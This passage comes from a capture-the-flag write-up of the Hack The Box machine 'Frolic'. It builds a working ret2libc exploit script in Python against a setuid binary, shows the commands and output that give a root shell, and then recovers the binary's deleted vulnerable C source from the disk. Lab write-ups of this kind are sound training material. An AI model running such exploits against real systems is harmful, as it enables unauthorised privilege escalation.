+  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
+  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
+  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
+
+=====================================================================================================================================
+
+system = 0x0003ada0     
+exit = 0x0002e9d0
+
+AND LASTLY we need a string that has /bin/sh
+
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+ 15ba0b /bin/sh
+=====================================================================================================================================
+
+Remember we have to add the address of libc to all the other gathered variables since all the other variable address are just offsets
+of the libc address.
+
+Commands and Output:
+=====================================================================================================================================
+import struct         
+
+libc = 0xb7e19000
+system = libc + 0x0003ada0
+exit = libc + 0x0002e9d0
+binsh = libc + 0x0015ba0b
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+import struct 
+
+libc = 0xb7e19000
+system = struct.pack('<I',libc + 0x0003ada0)
+exit = struct.pack('<I', libc + 0x0002e9d0)
+binsh = struct.pack('<I',libc + 0x0015ba0b)
+
+payload = system + exit + binsh
+print payload 
+=====================================================================================================================================
+
+We print our payload to check that the bytes align.
+We have 3 memory addresses and '0a' since it is a null byte because of line terminator.
+Commands and Output:
+=====================================================================================================================================
+└──╼ $python2 exploit.py 
+�=��y�
+      J��
+┌─[✗]─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $python2 exploit.py  | xxd
+00000000: a03d e5b7 d079 e4b7 0b4a f7b7 0a         .=...y...J...
+
+=====================================================================================================================================
+
+We also add our buffer to the exploit code.
+
+Commands and Output:
+=====================================================================================================================================
+import struct 
+
+junk = "A"*52
+libc = 0xb7e19000
+system = struct.pack('<I',libc + 0x0003ada0)
+exit = struct.pack('<I', libc + 0x0002e9d0)
+binsh = struct.pack('<I',libc + 0x0015ba0b)
+
+payload = junk + system + exit + binsh
+print payload 
+=====================================================================================================================================
+
+We base64 enocde the code to have it one line, so we can safely move the payload to the remote server.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $python2 exploit.py | base64 -w 0
+QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=
+=====================================================================================================================================
+
+Now we decode it and send it to a file called exploit.
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ cd /dev/shm
+www-data@frolic:/dev/shm$ echo -n "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=" | base64 -d
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�=��y�
+                                                          J��
+www-data@frolic:/dev/shm$ echo -n "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=" | base64 -d > exploit
+=====================================================================================================================================
+
+We can now run the binary use the newly created file and enter it as an argument.
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ ./rop $(cat /dev/shm/exploit )
+# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+=====================================================================================================================================
+
+We have now become the root user, thus owning the box.
+
+Interesting tidbits:
+
+If we explore ayush's bash history we see that, he deleted a file that contained rop.c
+Chances are that rop.c exsited in the filesystem.
+Commands and Output:
+=====================================================================================================================================
+cd /home/ayush
+cat .bash_history
+..
+..
+..
+ls
+rm rop.c 
+ls
+./file `python exploit.py`
+=====================================================================================================================================
+
+Let's try and restore the file.
+Commands and Output:
+=====================================================================================================================================
+root@frolic:/home/ayush/.binary# ./rop
+[*] Usage: program <message>
+root@frolic:/home/ayush/.binary# grep -a 'Usage: program <message>' -B10 -A10 /dev/sda1 
+grep: memory exhausted
+=====================================================================================================================================
+
+What this is doing is searching the block device for the string we grepped as well as outputing the 10 lines before and after the 
+text. Well that does not work so instead we will attempt by using the strings command.
+
+
+Commands and Output:
+=====================================================================================================================================
+root@frolic:/home/ayush/.binary# strings /dev/sda1 | grep -a 'Usage: program <message>' -B10 -A10
+=====================================================================================================================================
+
+We grab the strings and paste them to a file where we can try and reconstruct what the actual code is.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/frolic/rop]
+└──╼ $cat rop.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char *argv[])
+{
+    setuid(0);    
+    if (argc < 2)
+    {
+        printf("[*] Usage: program <message>\n");
+        return -1;
+    }
+    vuln(argv[1]);
+    return 0;
+}
+
+void vuln(char * arg)
+{
+    char text[40];
+    strcpy(text, arg);
+    printf("[+] Message sent: ");
+    printf(text);
+}
+=====================================================================================================================================
+
+If we go to sahay's bash_history and grep for gcc we can actually see the args used to compile the binary.
+Commands and Output:
+=====================================================================================================================================
+root@frolic:/home/sahay# cat .bash_history | grep gcc
+gcc -m32 -no-pie -o rop rop.c
+=====================================================================================================================================
+
+We can now actually compile and run the executable.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic/rop]
+└──╼ $./rop 
+[*] Usage: program <message>
+=====================================================================================================================================
+
+An alternative is using ssh to copy the entire disk and do the recovery on our local disk.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/frolic/rop]
+└──╼ $ssh root@10.10.10.111 "dd if=/dev/sda | gzip -1 -" | dd of=frolic.gz
+=====================================================================================================================================
+
+Once we have finished transferring the file we can now uncompress the gzip file and use a program called "photorec" to recover any 
+deleted files in the filesystem.
+Make sure testdisk is installed
+Commands and Output:
+=====================================================================================================================================
+sudo apt install testdisk
+mkdir recov
+photorec frolic
+..
+..
+..
+┌─[user@parrot-virtual]─[~/misc/frolic/recov]
+└──╼ $grep -R '<message>' .
+./recup_dir.2/f4776808.php:		$xml .= '<message>' . $message . '</message>' . "\n";
+./recup_dir.2/f13250776.c:        printf("[*] Usage: program <message>\n");
+./recup_dir.2/f13250784.txt:	.string	"[*] Usage: program <message>"
+grep: ./recup_dir.2/f13250792.elf: binary file matches
+grep: ./recup_dir.2/f13250816.elf: binary file matches
+=====================================================================================================================================
+
+We look for the following file "./recup_dir.2/f13250776.c:"
+and we cat the contents.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/misc/frolic/recov]
+└──╼ $cat ./recup_dir.2/f13250776.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+    setuid(0);    
+
+    if (argc < 2)
+    {
+        printf("[*] Usage: program <message>\n");
+        return -1;
+    }
+
+    vuln(argv[1]);
+
+    return 0;
+}
+
+void vuln(char * arg)
+{
+    char text[40];
+    strcpy(text, arg);
+
+    printf("[+] Message sent: ");
+    printf(text);
+}
+
+=====================================================================================================================================
+
+With that we have fully recovered the deleted c file.
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
+
